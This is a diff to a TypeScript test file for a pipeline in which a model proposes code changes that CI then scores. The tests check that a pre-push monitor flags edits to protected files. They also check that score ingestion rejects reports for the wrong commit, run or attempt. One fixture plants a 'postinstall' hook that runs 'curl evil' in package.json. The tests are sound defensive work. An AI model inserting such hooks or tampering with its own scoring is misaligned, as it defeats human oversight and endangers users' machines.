@@ -40,6 +40,7 @@ function report(over: Partial<ScoreReport> = {}): ScoreReport {
     run_id: "capsid-r1",
     attempt_id: "capsid-r1-a01",
     head_sha: "head01",
+    jti: "jti-run-01",
     anchors: { build_passes: 1 },
     secondary: {
       test_pass_rate: 0.9,
@@ -465,8 +466,137 @@ test("A DUPLICATE REPORT IS IGNORED, not counted twice", async () => {
     const first = await ingestScore(env, report(), NOW);
     const second = await ingestScore(env, report(), NOW);
     assert.equal(first.kept, true);
-    assert.match(second.message, /duplicate and was ignored/);
+    assert.equal(second.ok, true);
+    assert.match(second.message, /duplicate|ignored/);
     assert.equal(d1.rows.improve_runs[0].kept, 1, "a duplicate report counted the keep twice");
+  });
+});
+
+// ---- Fix 2: the deterministic path monitor runs BEFORE the branch is pushed --
+
+// A real streaming attempt response, in the shape proposeChange parses. The change
+// touches a protected path (package.json), which the pre-push gate must catch.
+function sseChange(files: Array<{ path: string; content: string }>): string {
+  const payload = JSON.stringify({ summary: "s", reasoning: "r", files });
+  const events: Array<[string, unknown]> = [
+    [
+      "message_start",
+      {
+        type: "message_start",
+        message: {
+          id: "msg_1",
+          type: "message",
+          role: "assistant",
+          model: "claude-sonnet-5",
+          content: [],
+          stop_reason: null,
+          usage: { input_tokens: 100, output_tokens: 0 },
+        },
+      },
+    ],
+    ["content_block_start", { type: "content_block_start", index: 0, content_block: { type: "text", text: "" } }],
+    ["content_block_delta", { type: "content_block_delta", index: 0, delta: { type: "text_delta", text: payload } }],
+    ["content_block_stop", { type: "content_block_stop", index: 0 }],
+    ["message_delta", { type: "message_delta", delta: { stop_reason: "end_turn" }, usage: { output_tokens: 20 } }],
+    ["message_stop", { type: "message_stop" }],
+  ];
+  return events.map(([name, data]) => `event: ${name}\ndata: ${JSON.stringify(data)}\n\n`).join("");
+}
+
+const ATTEMPTING = {
+  id: "capsid-r2",
+  namespace: "capsid",
+  mode: "api",
+  started: "2026-09-04 08:00:00",
+  status: "attempting",
+  attempts: 0,
+  base_sha: "base000",
+  advanced_at: "2026-09-04 08:04:00",
+};
+
+test("a proposal touching a protected path is flagged BEFORE any push or dispatch", async () => {
+  await withFetch(
+    {
+      "POST /v1/messages": {
+        contentType: "text/event-stream",
+        // The model proposes editing package.json, which measures the work.
+        text: sseChange([{ path: "package.json", content: '{"scripts":{"postinstall":"curl evil"}}' }]),
+      },
+    },
+    async (calls) => {
+      const { d1, env } = await harness({
+        apiKey: "sk-test",
+        improveRuns: [ATTEMPTING],
+      });
+      await tickRuns(env, NOW);
+      // The attempt is recorded flagged, and nothing was pushed or dispatched.
+      const attempt = d1.rows.improve_attempts[0];
+      assert.ok(attempt, "no attempt row was written");
+      assert.equal(attempt.status, "flagged", "the protected-path proposal was not flagged before push");
+      assert.equal(attempt.flagged, 1);
+      // The whole point: no branch write and no scorer dispatch ever reached GitHub.
+      const pushed = calls.find((c) => c.method === "PUT" && /\/contents\//.test(c.path));
+      const dispatched = calls.find((c) => /\/dispatches$/.test(c.path));
+      assert.equal(pushed, undefined, "a protected-path attempt was pushed to a branch");
+      assert.equal(dispatched, undefined, "a protected-path attempt was dispatched to CI");
+    }
+  );
+});
+
+// ---- Fix 5: ingest binds the report to the run's in-flight attempt ----------
+
+test("a report whose head_sha does not match the attempt is refused (ci_dispatch-against-master defeat)", async () => {
+  await withFetch(MODEL_ROUTE, async () => {
+    const { d1, env } = await harness({
+      apiKey: "sk-test",
+      documents: [ARCHIVE_DOC],
+      improveRuns: [AWAITING],
+      improveAttempts: [ATTEMPT],
+      improveScores: BASELINE,
+    });
+    // The attempt pushed head_sha "head01"; a report scoring a different commit
+    // (e.g. master, dispatched via ci_dispatch) must not be believed.
+    const result = await ingestScore(env, report({ head_sha: "masters-sha" }), NOW);
+    assert.equal(result.ok, false, "old code ignored head_sha and would have scored it");
+    assert.match(result.message, /different commit|head_sha/);
+    // Nothing was scored; the run is still waiting.
+    assert.equal(d1.rows.improve_runs[0].status, "awaiting-score");
+    assert.equal(d1.rows.improve_runs[0].kept, 0);
+  });
+});
+
+test("a report for an attempt from another run is refused", async () => {
+  await withFetch(MODEL_ROUTE, async () => {
+    const { d1, env } = await harness({
+      apiKey: "sk-test",
+      documents: [ARCHIVE_DOC],
+      improveRuns: [AWAITING],
+      improveAttempts: [{ ...ATTEMPT, run_id: "some-other-run" }],
+      improveScores: BASELINE,
+    });
+    const result = await ingestScore(env, report(), NOW);
+    assert.equal(result.ok, false, "old code did not check attempt.run_id");
+    assert.match(result.message, /belongs to run/);
+    assert.equal(d1.rows.improve_runs[0].status, "awaiting-score");
+  });
+});
+
+test("a report for an attempt the run is not currently awaiting is ignored, not scored", async () => {
+  await withFetch(MODEL_ROUTE, async () => {
+    const { d1, env } = await harness({
+      apiKey: "sk-test",
+      documents: [ARCHIVE_DOC],
+      // The run is waiting on a01; a02 also exists and is awaiting-score.
+      improveRuns: [AWAITING],
+      improveAttempts: [ATTEMPT, { ...ATTEMPT, id: "capsid-r1-a02", head_sha: "head02", branch: "improve/capsid-r1-a02" }],
+      improveScores: BASELINE,
+    });
+    const result = await ingestScore(env, report({ attempt_id: "capsid-r1-a02", head_sha: "head02" }), NOW);
+    assert.equal(result.ok, true);
+    assert.match(result.message, /not awaiting a score for|ignored/);
+    // Old code would have advanced the run to judging and scored a02. It did not.
+    assert.equal(d1.rows.improve_runs[0].status, "awaiting-score");
+    assert.equal(d1.rows.improve_runs[0].current_attempt, "capsid-r1-a01");
   });
 });
 
